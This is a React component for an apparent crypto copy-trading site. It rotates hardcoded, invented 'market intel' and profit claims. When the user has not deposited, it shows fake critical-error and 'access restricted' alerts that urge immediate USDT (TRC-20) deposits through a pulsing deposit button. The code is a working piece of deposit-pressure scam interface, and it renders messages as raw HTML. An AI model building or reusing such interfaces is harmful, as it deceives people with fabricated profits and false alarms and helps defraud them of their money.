
import React, { useEffect, useState } from 'react';

interface TacticalGuideProps {
  step: 'init' | 'deposit_needed' | 'ready' | 'investing' | 'profit';
  customMessage?: string;
  balance?: number;
  hasDeposited?: boolean;
  onDepositClick?: () => void;
}

const MARKET_INTEL = [
  { type: 'opportunity', text: "⚡ BTC SHORT just closed: +12% Profit (Missed)" },
  { type: 'opportunity', text: "⚡ ETH LONG Scalp Active: 88% Win Probability" },
  { type: 'warning', text: "⚠️ Market Volatility High. Secure liquidity now." },
  { type: 'opportunity', text: "⚡ Gold/USD Setup forming. 15min Window." },
  { type: 'info', text: "💎 Verified Users averaging $450/day profit." }
];

const TacticalGuide: React.FC<TacticalGuideProps> = ({ step, customMessage, balance = 0, hasDeposited = false, onDepositClick }) => {
  const [visible, setVisible] = useState(false);
  const [intelIndex, setIntelIndex] = useState(0);
  const [displayMode, setDisplayMode] = useState<'status' | 'intel'>('status');

  // Rotate Intel Messages
  useEffect(() => {
    const interval = setInterval(() => {
      if (step === 'ready' || step === 'init') {
        setDisplayMode(prev => prev === 'status' ? 'intel' : 'status');
        if (displayMode === 'intel') {
          setIntelIndex(prev => (prev + 1) % MARKET_INTEL.length);
        }
      }
    }, 6000);
    return () => clearInterval(interval);
  }, [step, displayMode]);

  useEffect(() => {
    setVisible(false);
    const timer = setTimeout(() => {
      setVisible(true);
    }, 500);
    return () => clearTimeout(timer);
  }, [step, customMessage]);

  const getStatusContent = (): { title: string; msg: string; color: string; action?: string } => {
    if (customMessage) return { title: "SYSTEM ALERT", msg: customMessage, color: "text-white" };

    // --- CRITICAL DEPOSIT PUSH LOGIC ---
    if (!hasDeposited && balance < 50) {
       return {
         title: "⛔ CRITICAL ERROR: NODE INACTIVE",
         msg: "Trading paused. Liquidity below threshold ($500). <span class='text-[#f01a64] font-black'>Deposit USDT immediately to restore execution.</span>",
         color: "text-[#f01a64] animate-pulse",
         action: "RESOLVE NOW"
       };
    }

    if (step === 'deposit_needed') {
       return {
         title: "🔒 ACCESS RESTRICTED",
         msg: "Institutional Mirroring requires <span class='text-white font-bold'>Account Verification</span>. Deposit USDT (TRC-20) to unlock profits.",
         color: "text-amber-500",
         action: "UNLOCK ACCESS"
       };
    }

    switch (step) {
      case 'init':
        return {
          title: "Waiting for Command...",
          msg: "Select a high-yield strategy above to begin auto-replication.",
          color: "text-gray-400"
        };
      case 'investing':
        return {
          title: "⚙️ EXECUTING ORDER BLOCK",
          msg: "Mirroring expert trades in real time. <span class='text-white font-bold'>Syncing market orders...</span>",
          color: "text-[#f01a64]"
        };
      case 'profit':
        return {
          title: "✅ TRADE SUCCESSFUL",
          msg: "Profit captured. Funds routed to secure ledger. System ready for next cycle.",
          color: "text-[#00b36b]"
        };
      default:
        return {
           title: "SYSTEM READY",
           msg: "Market conditions optimal. Deploy capital now.",
           color: "text-[#00b36b]"
        };
    }
  };

  const currentIntel = MARKET_INTEL[intelIndex];
  const content: { title: string; msg: string; color: string; action?: string } = displayMode === 'intel' && !customMessage && step !== 'investing' && step !== 'profit'
    ? { 
        title: "📡 LIVE MARKET INTEL", 
        msg: currentIntel.text, 
        color: currentIntel.type === 'warning' ? "text-amber-500" : "text-blue-400" 
      } 
    : getStatusContent();

  return (
    <div 
      className={`fixed bottom-24 left-4 right-4 md:left-1/2 md:-translate-x-1/2 md:w-auto md:min-w-[480px] z-40 transition-all duration-700 transform ${visible ? 'translate-y-0 opacity-100' : 'translate-y-8 opacity-0'}`}
    >
      <div className={`backdrop-blur-3xl border p-5 rounded-[2rem] shadow-[0_0_50px_rgba(0,0,0,0.5)] flex items-center gap-5 relative overflow-hidden group transition-colors duration-500 ${content.color.includes('text-[#f01a64]') ? 'bg-[#1e222d]/95 border-[#f01a64]/50' : 'bg-[#1e222d]/90 border-white/10'}`}>
        
        {/* Scanning Line Animation */}
        <div className="absolute top-0 bottom-0 left-0 w-[2px] bg-gradient-to-b from-transparent via-white to-transparent opacity-20 animate-[progress_2s_ease-in-out_infinite]"></div>
        
        {/* HUD Icon */}
        <div className="shrink-0 w-12 h-12 rounded-2xl bg-black/50 border border-white/10 flex items-center justify-center relative overflow-hidden">
           {content.color.includes('text-[#f01a64]') ? (
             <div className="w-full h-full bg-[#f01a64]/20 flex items-center justify-center animate-pulse">
                <svg className="w-6 h-6 text-[#f01a64]" fill="none" viewBox="0 0 24 24" stroke="currentColor"><path strokeLinecap="round" strokeLinejoin="round" strokeWidth={2} d="M12 9v2m0 4h.01m-6.938 4h13.856c1.54 0 2.502-1.667 1.732-3L13.732 4c-.77-1.333-2.694-1.333-3.464 0L3.34 16c-.77 1.333.192 3 1.732 3z" /></svg>
             </div>
           ) : (
             <div className="w-2 h-2 rounded-full bg-[#00b36b] shadow-[0_0_10px_#00b36b] animate-ping"></div>
           )}
        </div>

        <div className="flex-1 min-w-0">
          <div className="flex justify-between items-center mb-1.5">
            <span className={`text-[9px] font-black uppercase tracking-[0.3em] ${content.color}`}>
              {content.title}
            </span>
            {balance < 100 && !hasDeposited && (
               <span className="text-[8px] font-mono text-[#f01a64] bg-[#f01a64]/10 px-1.5 py-0.5 rounded font-black animate-pulse">LIQUIDITY LOW</span>
            )}
          </div>
          <p 
            className="text-[11px] text-gray-300 font-medium leading-relaxed font-sans truncate sm:whitespace-normal"
            dangerouslySetInnerHTML={{ __html: content.msg }}
          />
        </div>

        {/* Action Button for Deposit Push */}
        {content.action && onDepositClick && (
           <button 
             onClick={onDepositClick}
             className="shrink-0 px-4 py-3 bg-[#f01a64] hover:bg-pink-700 text-white text-[9px] font-black uppercase tracking-widest rounded-xl shadow-lg active:scale-95 transition-all border border-white/10 animate-bounce"
           >
             {content.action}
           </button>
        )}
      </div>
    </div>
  );
};

export default TacticalGuide;
